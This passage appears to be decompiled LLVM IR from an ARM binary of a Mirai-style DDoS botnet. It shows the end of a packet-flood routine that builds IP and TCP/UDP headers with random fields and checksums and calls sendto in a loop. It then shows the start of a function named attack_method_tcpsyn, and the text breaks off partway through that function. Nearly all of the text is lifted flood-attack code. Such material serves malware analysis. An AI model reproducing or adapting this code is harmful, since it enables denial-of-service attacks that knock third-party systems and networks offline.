  %v2_bf3c = add i32 %v3_bf44.pre, 13
  %v3_bf3c = inttoptr i32 %v2_bf3c to i8*
  %v4_bf3c = load i8, i8* %v3_bf3c, align 1
  %v5_bf3c = zext i8 %v4_bf3c to i32
  %v2_bf40 = or i32 %v5_bf3c, 8
  store i32 %v2_bf40, i32* @r3, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread, %bb68
  %v4_bf44 = add i32 %v3_bf44.pre, 14
  %v5_bf44 = inttoptr i32 %v4_bf44 to i16*
  store i16 %v1_bf30, i16* %v5_bf44, align 2
  store i32 %v6_bc94, i32* %r1.global-to-local, align 4
  %v0_bf4c = load i32, i32* @r5, align 4
  %v1_bf4c = add i32 %v0_bf4c, 40
  store i32 %v1_bf4c, i32* %r0.global-to-local, align 4
  br i1 %v2_bf38, label %bb70, label %bb69

bb69:                                             ; preds = %.thread4
  %v1_bf50 = load i32, i32* @r3, align 4
  %v2_bf50 = trunc i32 %v1_bf50 to i8
  %v3_bf50 = load i32, i32* @r4, align 4
  %v4_bf50 = add i32 %v3_bf50, 13
  %v5_bf50 = inttoptr i32 %v4_bf50 to i8*
  store i8 %v2_bf50, i8* %v5_bf50, align 1
  br label %bb70

bb70:                                             ; preds = %.thread4, %bb69
  %v2_bf54 = inttoptr i32 %v1_bf4c to i16*
  %v3_bf54 = call i32 @rand_str(i16* %v2_bf54, i32 %v6_bc94)
  store i32 %v3_bf54, i32* %r0.global-to-local, align 4
  %v3_bf58 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bf58, i32* %r3.global-to-local, align 4
  %v1_bf5c = add i32 %v3_bf58, 1
  store i32 %v1_bf5c, i32* @r4, align 4
  %v1_bf60 = load i32, i32* @r7, align 4
  %v9_bf60 = icmp eq i32 %v1_bf5c, %v1_bf60
  store i1 %v9_bf60, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bf5c, i32* %stack_var_-44, align 4
  %v5_bf68 = icmp slt i32 %v1_bf5c, %v1_bf60
  br i1 %v5_bf68, label %dec_label_pc_be04, label %dec_label_pc_bf6c

dec_label_pc_bf6c:                                ; preds = %bb70
  store i32 %v6_bc94, i32* %r3.global-to-local, align 4
  %v1_bf70 = add i32 %v6_bc94, 20
  store i32 %v1_bf70, i32* @sb, align 4
  br label %dec_label_pc_bf78

dec_label_pc_bf78:                                ; preds = %dec_label_pc_c1bc, %dec_label_pc_bf6c
  %v0_bf908 = phi i32 [ %v1_bf60, %dec_label_pc_bf6c ], [ 0, %dec_label_pc_c1bc ]
  %stack_var_-140.0 = phi i32 [ %v3_bd54, %dec_label_pc_bf6c ], [ %v3_c1c8, %dec_label_pc_c1bc ]
  %storemerge = add i32 %v6_bc94, 40
  store i32 %storemerge, i32* %fp.global-to-local, align 4
  store i32 %stack_var_-140.0, i32* %r1.global-to-local, align 4
  %v1_bf7c = add i32 %stack_var_-140.0, 1310720
  store i32 %v1_bf7c, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v1_bf7c, 256
  %v3_bf84 = and i32 %tmp71, 65280
  store i32 %v3_bf84, i32* %r3.global-to-local, align 4
  %v4_bf88 = udiv i32 %v1_bf7c, 16777216
  %v5_bf88 = or i32 %v3_bf84, %v4_bf88
  store i32 %v5_bf88, i32* @sl, align 4
  %v3_c128 = icmp eq i32 %v3_bd2c, 65535
  %v2_c18c = icmp eq i32 %v1_bcbc, 0
  %v2_bfc8 = icmp eq i32 %v6_bcd0, -1
  %v7_bfc8 = icmp eq i32 %v6_bcd0, -1
  br label %dec_label_pc_bf8c

dec_label_pc_bf8c:                                ; preds = %dec_label_pc_bf8c, %dec_label_pc_c0a4, %dec_label_pc_bf78
  %v0_bf90 = phi i32 [ %v0_bf908, %dec_label_pc_bf78 ], [ 0, %dec_label_pc_c0a4 ], [ 0, %dec_label_pc_bf8c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_bf90 = icmp eq i32 %v0_bf90, 0
  store i1 %v2_bf90, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bf90, label %dec_label_pc_bf8c, label %dec_label_pc_bf9c

dec_label_pc_bf9c:                                ; preds = %dec_label_pc_bf8c, %dec_label_pc_c0a4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bfa0

dec_label_pc_bfa0:                                ; preds = %dec_label_pc_c020, %dec_label_pc_bf9c
  %v1_bfb4 = phi i32 [ %v1_c094, %dec_label_pc_c020 ], [ 0, %dec_label_pc_bf9c ]
  %v5_bfa4 = mul i32 %v1_bfb4, 24
  %v1_bfa8 = load i32, i32* @r8, align 4
  %v2_bfa8 = add i32 %v1_bfa8, %v5_bfa4
  store i32 %v2_bfa8, i32* %r3.global-to-local, align 4
  store i32 %v2_bb00, i32* %ip.global-to-local, align 4
  %v1_bfb0 = add i32 %v2_bfa8, 20
  %v2_bfb0 = inttoptr i32 %v1_bfb0 to i8*
  %v3_bfb0 = load i8, i8* %v2_bfb0, align 1
  %v4_bfb0 = zext i8 %v3_bfb0 to i32
  store i32 %v4_bfb0, i32* %r2.global-to-local, align 4
  %v4_bfb4 = mul i32 %v1_bfb4, 4
  %v5_bfb4 = add i32 %v4_bfb4, %v2_bb00
  %v6_bfb4 = inttoptr i32 %v5_bfb4 to i32*
  %v7_bfb4 = load i32, i32* %v6_bfb4, align 4
  store i32 %v7_bfb4, i32* @r5, align 4
  %v7_bfb8 = icmp eq i8 %v3_bfb0, 31
  store i1 %v7_bfb8, i1* %cpsr_z.global-to-local, align 1
  %v1_bfbc = add i32 %v7_bfb4, 20
  store i32 %v1_bfbc, i32* @r6, align 4
  %tmp77 = icmp ult i8 %v3_bfb0, 32
  br i1 %tmp77, label %dec_label_pc_c0b8, label %dec_label_pc_bfc4

dec_label_pc_bfc4:                                ; preds = %dec_label_pc_bfa0
  store i32 %v6_bcd0, i32* %r0.global-to-local, align 4
  store i1 %v7_bfc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bfc8, label %dec_label_pc_c118, label %dec_label_pc_bfd0

dec_label_pc_bfd0:                                ; preds = %dec_label_pc_c0b8, %dec_label_pc_bfc4
  store i32 %v3_bd2c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c128, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c128, label %dec_label_pc_c134, label %dec_label_pc_bfe4

dec_label_pc_bfe4:                                ; preds = %dec_label_pc_c118.dec_label_pc_bfe4_crit_edge, %dec_label_pc_bfd0
  %v1_bfe8 = phi i32 [ %v1_bfe8.pre, %dec_label_pc_c118.dec_label_pc_bfe4_crit_edge ], [ 65535, %dec_label_pc_bfd0 ]
  store i32 %v3_bd30, i32* %r2.global-to-local, align 4
  %v9_bfe8 = icmp eq i32 %v3_bd30, %v1_bfe8
  store i1 %v9_bfe8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bfe8, label %dec_label_pc_c148, label %dec_label_pc_bff0

dec_label_pc_bff0:                                ; preds = %dec_label_pc_c134.dec_label_pc_bff0_crit_edge, %dec_label_pc_bfe4
  %v1_bff4 = phi i32 [ %v1_bff4.pre, %dec_label_pc_c134.dec_label_pc_bff0_crit_edge ], [ %v1_bfe8, %dec_label_pc_bfe4 ]
  store i32 %v3_bd34, i32* %r3.global-to-local, align 4
  %v9_bff4 = icmp eq i32 %v3_bd34, %v1_bff4
  store i1 %v9_bff4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bff4, label %dec_label_pc_c15c, label %dec_label_pc_bffc

dec_label_pc_bffc:                                ; preds = %dec_label_pc_c148.dec_label_pc_bffc_crit_edge, %dec_label_pc_bff0
  %v1_c000 = phi i32 [ %v1_c000.pre, %dec_label_pc_c148.dec_label_pc_bffc_crit_edge ], [ %v1_bff4, %dec_label_pc_bff0 ]
  store i32 %v5_bbd0, i32* %ip.global-to-local, align 4
  %v9_c000 = icmp eq i32 %v5_bbd0, %v1_c000
  store i1 %v9_c000, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c000, label %dec_label_pc_c170, label %dec_label_pc_c008

dec_label_pc_c008:                                ; preds = %dec_label_pc_c15c.dec_label_pc_c008_crit_edge, %dec_label_pc_bffc
  %v1_c00c = phi i32 [ %v1_c00c.pre, %dec_label_pc_c15c.dec_label_pc_c008_crit_edge ], [ %v1_c000, %dec_label_pc_bffc ]
  store i32 %v6_bbec, i32* %r0.global-to-local, align 4
  %v9_c00c = icmp eq i32 %v6_bbec, %v1_c00c
  store i1 %v9_c00c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c00c, label %dec_label_pc_c184, label %dec_label_pc_c014

dec_label_pc_c014:                                ; preds = %dec_label_pc_c170, %dec_label_pc_c008
  store i32 %v1_bcbc, i32* %r1.global-to-local, align 4
  store i1 %v2_c18c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c18c, label %dec_label_pc_c020, label %dec_label_pc_c198

dec_label_pc_c020:                                ; preds = %dec_label_pc_c014, %dec_label_pc_c184, %dec_label_pc_c198
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_c024 = load i32, i32* @r5, align 4
  %v3_c024 = add i32 %v2_c024, 10
  %v4_c024 = inttoptr i32 %v3_c024 to i16*
  store i16 0, i16* %v4_c024, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c02c = load i32, i32* @r5, align 4
  store i32 %v0_c02c, i32* @r0, align 4
  %v2_c030 = call i32 @checksum_generic(i32 %v0_c02c, i32 20)
  %v3_c030 = trunc i32 %v2_c030 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_c038 = load i32, i32* @r5, align 4
  %v4_c038 = add i32 %v3_c038, 10
  %v5_c038 = inttoptr i32 %v4_c038 to i16*
  store i16 %v3_c030, i16* %v5_c038, align 2
  %v0_c03c = load i32, i32* @r6, align 4
  store i32 %v0_c03c, i32* @r1, align 4
  %v0_c040 = load i32, i32* %r3.global-to-local, align 4
  %v1_c040 = trunc i32 %v0_c040 to i16
  %v3_c040 = add i32 %v0_c03c, 16
  %v4_c040 = inttoptr i32 %v3_c040 to i16*
  store i16 %v1_c040, i16* %v4_c040, align 2
  %v0_c044 = load i32, i32* @sl, align 4
  store i32 %v0_c044, i32* %r2.global-to-local, align 4
  %v0_c048 = load i32, i32* @sb, align 4
  store i32 %v0_c048, i32* %r3.global-to-local, align 4
  %v0_c04c = load i32, i32* @r5, align 4
  store i32 %v0_c04c, i32* %r0.global-to-local, align 4
  %v4_c050 = call i32 @checksum_tcpudp(i32 %v0_c04c, i32 %v0_c03c, i32 %v0_c044, i32 %v0_c048)
  %v5_c050 = trunc i32 %v4_c050 to i16
  store i32 %v4_c050, i32* %r0.global-to-local, align 4
  %v3_c054 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c054, i32* %r3.global-to-local, align 4
  %v3_c058 = mul i32 %v3_c054, 32
  store i32 %v3_c058, i32* %lr.global-to-local, align 4
  %v3_c05c = load i32, i32* @r6, align 4
  %v4_c05c = add i32 %v3_c05c, 16
  %v5_c05c = inttoptr i32 %v4_c05c to i16*
  store i16 %v5_c050, i16* %v5_c05c, align 2
  %v0_c060 = load i32, i32* %lr.global-to-local, align 4
  %v1_c060 = load i32, i32* %r3.global-to-local, align 4
  %tmp78 = mul i32 %v1_c060, -8
  %v5_c060 = add i32 %v0_c060, %tmp78
  store i32 %v5_c060, i32* %lr.global-to-local, align 4
  %v0_c064 = load i32, i32* @r6, align 4
  %v1_c064 = add i32 %v0_c064, 2
  %v2_c064 = inttoptr i32 %v1_c064 to i16*
  %v3_c064 = load i16, i16* %v2_c064, align 2
  %v4_c064 = zext i16 %v3_c064 to i32
  store i32 %v4_c064, i32* @r6, align 4
  %v1_c068 = load i32, i32* @r8, align 4
  %v2_c068 = add i32 %v1_c068, %v5_c060
  store i32 %v2_c068, i32* @lr, align 4
  %v3_c06c = add i32 %v2_c068, 2
  %v4_c06c = inttoptr i32 %v3_c06c to i16*
  store i16 %v3_c064, i16* %v4_c06c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_c078 = load i32, i32* @r5, align 4
  store i32 %v0_c078, i32* %r1.global-to-local, align 4
  store i32 %v3_bce4, i32* %r0.global-to-local, align 4
  %v0_c080 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_c080, i32* %r2.global-to-local, align 4
  %v0_c084 = load i32, i32* @lr, align 4
  %v6_c08c = call i32 @__libc_sendto(i32 %v3_bce4, i32 %v0_c078, i32 %v0_c080, i32 16384, i32 %v0_c084, i32 16)
  %v3_c090 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c090, i32* %r3.global-to-local, align 4
  %v1_c094 = add i32 %v3_c090, 1
  store i32 %v1_c094, i32* %r0.global-to-local, align 4
  %v1_c098 = load i32, i32* @r7, align 4
  %v9_c098 = icmp eq i32 %v1_c094, %v1_c098
  store i1 %v9_c098, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c094, i32* %stack_var_-44, align 4
  %v5_c0a0 = icmp slt i32 %v1_c094, %v1_c098
  br i1 %v5_c0a0, label %dec_label_pc_bfa0, label %dec_label_pc_c0a4

dec_label_pc_c0a4:                                ; preds = %dec_label_pc_c020
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c0a8 = icmp eq i32 %v1_c098, 0
  store i1 %v2_c0a8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c0a8, label %dec_label_pc_bf8c, label %dec_label_pc_bf9c

dec_label_pc_c0b8:                                ; preds = %dec_label_pc_bfa0
  %v1_c0b8 = add i32 %v2_bfa8, 16
  %v2_c0b8 = inttoptr i32 %v1_c0b8 to i32*
  %v3_c0b8 = load i32, i32* %v2_c0b8, align 4
  %v0_c0bc = call i32 @rand_next()
  store i32 %v0_c0bc, i32* %r0.global-to-local, align 4
  %v3_c0c0 = load i32, i32* %stack_var_-44, align 4
  %v5_c0c8 = mul i32 %v3_c0c0, 24
  %v1_c0cc = and i32 %v3_c0b8, 16711680
  store i32 %v1_c0cc, i32* %ip.global-to-local, align 4
  %v3_c0d0 = udiv i32 %v3_c0b8, 16777216
  %v4_c0d4 = udiv i32 %v1_c0cc, 256
  %v5_c0d4 = or i32 %v4_c0d4, %v3_c0d0
  store i32 %v5_c0d4, i32* %r2.global-to-local, align 4
  %v1_c0d8 = load i32, i32* @r8, align 4
  %v2_c0d8 = add i32 %v1_c0d8, %v5_c0c8
  store i32 %v2_c0d8, i32* %r1.global-to-local, align 4
  %v1_c0dc = and i32 %v3_c0b8, ptrtoint (i32* @global_var_ff00.32 to i32)
  store i32 %v1_c0dc, i32* %r3.global-to-local, align 4
  %v1_c0e0 = add i32 %v2_c0d8, 20
  %v2_c0e0 = inttoptr i32 %v1_c0e0 to i8*
  %v3_c0e0 = load i8, i8* %v2_c0e0, align 1
  %v4_c0e0 = zext i8 %v3_c0e0 to i32
  store i32 %v4_c0e0, i32* %ip.global-to-local, align 4
  %v4_c0e4 = mul i32 %v1_c0dc, 256
  %v4_c0e8 = mul i32 %v3_c0b8, 16777216
  %v5_c0e4 = or i32 %v4_c0e4, %v4_c0e8
  %v5_c0e8 = or i32 %v5_c0e4, %v5_c0d4
  %v7_c0ec = lshr i32 %v0_c0bc, %v4_c0e0
  %v8_c0ec = add i32 %v7_c0ec, %v5_c0e8
  store i32 %v8_c0ec, i32* %r2.global-to-local, align 4
  %v1_c0fc = and i32 %v8_c0ec, 65280
  store i32 %v1_c0fc, i32* %r1.global-to-local, align 4
  store i32 %v6_bcd0, i32* %r0.global-to-local, align 4
  %v5_c108 = call i32 @llvm.bswap.i32(i32 %v8_c0ec)
  store i32 %v5_c108, i32* %r3.global-to-local, align 4
  store i1 %v7_bfc8, i1* %cpsr_z.global-to-local, align 1
  %v1_c110 = load i32, i32* @r5, align 4
  %v2_c110 = add i32 %v1_c110, 16
  %v3_c110 = inttoptr i32 %v2_c110 to i32*
  store i32 %v5_c108, i32* %v3_c110, align 4
  br i1 %v2_bfc8, label %dec_label_pc_c118, label %dec_label_pc_bfd0

dec_label_pc_c118:                                ; preds = %dec_label_pc_c0b8, %dec_label_pc_bfc4
  %v0_c118 = call i32 @rand_next()
  store i32 %v0_c118, i32* %r0.global-to-local, align 4
  store i32 %v3_bd2c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c128, i1* %cpsr_z.global-to-local, align 1
  %v1_c12c = load i32, i32* @r5, align 4
  %v2_c12c = add i32 %v1_c12c, 12
  %v3_c12c = inttoptr i32 %v2_c12c to i32*
  store i32 %v0_c118, i32* %v3_c12c, align 4
  br i1 %v3_c128, label %dec_label_pc_c134, label %dec_label_pc_c118.dec_label_pc_bfe4_crit_edge

dec_label_pc_c118.dec_label_pc_bfe4_crit_edge:    ; preds = %dec_label_pc_c118
  %v1_bfe8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bfe4

dec_label_pc_c134:                                ; preds = %dec_label_pc_c118, %dec_label_pc_bfd0
  %v0_c134 = call i32 @rand_next()
  %v1_c134 = trunc i32 %v0_c134 to i16
  store i32 %v0_c134, i32* %r0.global-to-local, align 4
  store i32 %v3_bd30, i32* %r2.global-to-local, align 4
  %v1_c13c = load i32, i32* @r4, align 4
  %v9_c13c = icmp eq i32 %v3_bd30, %v1_c13c
  store i1 %v9_c13c, i1* %cpsr_z.global-to-local, align 1
  %v3_c140 = load i32, i32* @r5, align 4
  %v4_c140 = add i32 %v3_c140, 4
  %v5_c140 = inttoptr i32 %v4_c140 to i16*
  store i16 %v1_c134, i16* %v5_c140, align 2
  br i1 %v9_c13c, label %dec_label_pc_c148, label %dec_label_pc_c134.dec_label_pc_bff0_crit_edge

dec_label_pc_c134.dec_label_pc_bff0_crit_edge:    ; preds = %dec_label_pc_c134
  %v1_bff4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bff0

dec_label_pc_c148:                                ; preds = %dec_label_pc_c134, %dec_label_pc_bfe4
  %v0_c148 = call i32 @rand_next()
  %v1_c148 = trunc i32 %v0_c148 to i16
  store i32 %v0_c148, i32* %r0.global-to-local, align 4
  store i32 %v3_bd34, i32* %r3.global-to-local, align 4
  %v1_c150 = load i32, i32* @r4, align 4
  %v9_c150 = icmp eq i32 %v3_bd34, %v1_c150
  store i1 %v9_c150, i1* %cpsr_z.global-to-local, align 1
  %v3_c154 = load i32, i32* @r5, align 4
  %v4_c154 = add i32 %v3_c154, 20
  %v5_c154 = inttoptr i32 %v4_c154 to i16*
  store i16 %v1_c148, i16* %v5_c154, align 2
  br i1 %v9_c150, label %dec_label_pc_c15c, label %dec_label_pc_c148.dec_label_pc_bffc_crit_edge

dec_label_pc_c148.dec_label_pc_bffc_crit_edge:    ; preds = %dec_label_pc_c148
  %v1_c000.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bffc

dec_label_pc_c15c:                                ; preds = %dec_label_pc_c148, %dec_label_pc_bff0
  %v0_c15c = call i32 @rand_next()
  %v1_c15c = trunc i32 %v0_c15c to i16
  store i32 %v0_c15c, i32* %r0.global-to-local, align 4
  store i32 %v5_bbd0, i32* %ip.global-to-local, align 4
  %v1_c164 = load i32, i32* @r4, align 4
  %v9_c164 = icmp eq i32 %v5_bbd0, %v1_c164
  store i1 %v9_c164, i1* %cpsr_z.global-to-local, align 1
  %v3_c168 = load i32, i32* @r6, align 4
  %v4_c168 = add i32 %v3_c168, 2
  %v5_c168 = inttoptr i32 %v4_c168 to i16*
  store i16 %v1_c15c, i16* %v5_c168, align 2
  br i1 %v9_c164, label %dec_label_pc_c170, label %dec_label_pc_c15c.dec_label_pc_c008_crit_edge

dec_label_pc_c15c.dec_label_pc_c008_crit_edge:    ; preds = %dec_label_pc_c15c
  %v1_c00c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c008

dec_label_pc_c170:                                ; preds = %dec_label_pc_c15c, %dec_label_pc_bffc
  %v0_c170 = call i32 @rand_next()
  %v1_c174 = load i32, i32* @r6, align 4
  %v2_c174 = add i32 %v1_c174, 4
  %v3_c174 = inttoptr i32 %v2_c174 to i32*
  store i32 %v0_c170, i32* %v3_c174, align 4
  store i32 %v6_bbec, i32* %r0.global-to-local, align 4
  %v1_c17c = load i32, i32* @r4, align 4
  %v9_c17c = icmp eq i32 %v6_bbec, %v1_c17c
  store i1 %v9_c17c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c17c, label %dec_label_pc_c184, label %dec_label_pc_c014

dec_label_pc_c184:                                ; preds = %dec_label_pc_c170, %dec_label_pc_c008
  %v0_c184 = call i32 @rand_next()
  store i32 %v0_c184, i32* %r0.global-to-local, align 4
  store i32 %v1_bcbc, i32* %r1.global-to-local, align 4
  store i1 %v2_c18c, i1* %cpsr_z.global-to-local, align 1
  %v1_c190 = load i32, i32* @r6, align 4
  %v2_c190 = add i32 %v1_c190, 8
  %v3_c190 = inttoptr i32 %v2_c190 to i32*
  store i32 %v0_c184, i32* %v3_c190, align 4
  br i1 %v2_c18c, label %dec_label_pc_c020, label %dec_label_pc_c198

dec_label_pc_c198:                                ; preds = %dec_label_pc_c014, %dec_label_pc_c184
  %v0_c198 = load i32, i32* @r5, align 4
  %v1_c198 = add i32 %v0_c198, 40
  store i32 %v1_c198, i32* %r0.global-to-local, align 4
  store i32 %v6_bc94, i32* %r1.global-to-local, align 4
  %v2_c1a0 = inttoptr i32 %v1_c198 to i16*
  %v3_c1a0 = call i32 @rand_str(i16* %v2_c1a0, i32 %v6_bc94)
  store i32 %v3_c1a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c020

dec_label_pc_c1a8:                                ; preds = %dec_label_pc_bcf4
  store i32 %v3_bce4, i32* %r0.global-to-local, align 4
  %v1_c1ac = call i32 @__GI___libc_close(i32 %v3_bce4)
  store i32 %v1_c1ac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c1b0

dec_label_pc_c1b0:                                ; preds = %entry, %dec_label_pc_c1a8
  %v1_c1b8 = phi i32 [ %v3_bce4, %entry ], [ %v1_c1ac, %dec_label_pc_c1a8 ]
  store i32 %v18_bae4, i32* %sb.global-to-local, align 4
  store i32 %v24_bae4, i32* %fp.global-to-local, align 4
  store i32 %v27_bae4, i32* %lr.global-to-local, align 4
  ret i32 %v1_c1b8

dec_label_pc_c1bc:                                ; preds = %dec_label_pc_bd1c
  store i32 %v6_bc94, i32* %r0.global-to-local, align 4
  %v1_c1c4 = add i32 %v6_bc94, 20
  store i32 %v1_c1c4, i32* @sb, align 4
  %v3_c1c8 = mul i32 %v6_bc94, 65536
  store i32 %v3_c1c8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_bf78

; uselistorder directives
  uselistorder i32 %v0_c15c, { 1, 0 }
  uselistorder i32 %v0_c148, { 1, 0 }
  uselistorder i32 %v0_c134, { 1, 0 }
  uselistorder i32 %v5_c108, { 1, 0 }
  uselistorder i32 %v3_c0b8, { 3, 1, 2, 0 }
  uselistorder i32 %v1_c094, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_c060, { 1, 0 }
  uselistorder i32 %v4_c050, { 1, 0 }
  uselistorder i1 %v7_bfc8, { 2, 1, 0 }
  uselistorder i1 %v2_c18c, { 2, 3, 1, 0 }
  uselistorder i1 %v3_c128, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-140.0, { 1, 0 }
  uselistorder i32 %v1_bf5c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_bf30, { 1, 0 }
  uselistorder i32 %v1_bde4, { 1, 2, 0 }
  uselistorder i32 %v1_bde0, { 2, 1, 0 }
  uselistorder i32 %v1_bddc, { 2, 0, 1 }
  uselistorder i32 %v1_bdd8, { 2, 0, 1 }
  uselistorder i32 %v1_bdd4, { 2, 0, 1 }
  uselistorder i32 %v1_bdac, { 1, 0 }
  uselistorder i32 %v3_bd54, { 1, 0 }
  uselistorder i32 %v3_bd2c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_bd24, { 1, 0, 2 }
  uselistorder i32 %v0_bd20, { 1, 0, 2 }
  uselistorder i32 %v0_bd1c, { 1, 0, 3, 2 }
  uselistorder i1 %v7_bd14, { 1, 0 }
  uselistorder i1 %v7_bce8, { 1, 0 }
  uselistorder i32 %v3_bce4, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_bcd0, { 5, 3, 0, 4, 2, 1 }
  uselistorder i32 %v1_bcbc, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_bc94, { 0, 10, 9, 8, 7, 2, 4, 3, 6, 5, 1 }
  uselistorder i32 %v6_bbec, { 3, 2, 1, 0 }
  uselistorder i32 %v5_bbd0, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_bb80, { 1, 0 }
  uselistorder i32 %v2_bb00, { 0, 4, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 36, 35, 38, 37, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 6, 4, 7, 5, 8, 9, 10, 12, 11, 14, 13, 15, 17, 16, 18, 19, 20, 22, 21, 27, 23, 24, 25, 26, 31, 28, 29, 30, 32, 34, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i16 64, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c1b0, { 1, 0 }
  uselistorder label %dec_label_pc_c198, { 1, 0 }
  uselistorder label %dec_label_pc_c020, { 2, 1, 0 }
  uselistorder label %dec_label_pc_bf9c, { 1, 0 }
  uselistorder label %dec_label_pc_bf8c, { 1, 0, 2 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_method_tcpsyn(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_c1dc = load i32, i32* @r4, align 4
  %v24_c1dc = load i32, i32* @fp, align 4
  %v27_c1dc = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_c1f8 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_c1fc = load i32, i32* @r5, align 4
  store i32 %v0_c1fc, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_c1f8, i32* @sb, align 4
  %v0_c20c = load i32, i32* @r4, align 4
  store i32 %v0_c20c, i32* %r0.global-to-local, align 4
  %v4_c210 = inttoptr i32 %v0_c1fc to i32*
  %v5_c210 = call i32 @attack_get_opt_int(i32 %v0_c20c, i32* %v4_c210, i32 2, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c228 = load i32, i32* @r5, align 4
  store i32 %v0_c228, i32* %r1.global-to-local, align 4
  %v0_c22c = load i32, i32* @r4, align 4
  store i32 %v0_c22c, i32* %r0.global-to-local, align 4
  %v5_c230 = trunc i32 %v5_c210 to i8
  %v6_c234 = inttoptr i32 %v0_c228 to i32*
  %v7_c234 = call i32 @attack_get_opt_int(i32 %v0_c22c, i32* %v6_c234, i32 3, i32 65535)
  %v0_c238 = load i32, i32* @r5, align 4
  store i32 %v0_c238, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_c248 = load i32, i32* @r4, align 4
  store i32 %v0_c248, i32* %r0.global-to-local, align 4
  %v5_c24c = inttoptr i32 %v0_c238 to i32*
  %v6_c24c = call i32 @attack_get_opt_int(i32 %v0_c248, i32* %v5_c24c, i32 4, i32 64)
  %v1_c254 = urem i32 %v6_c24c, 256
  %v0_c258 = load i32, i32* @r5, align 4
  store i32 %v0_c258, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
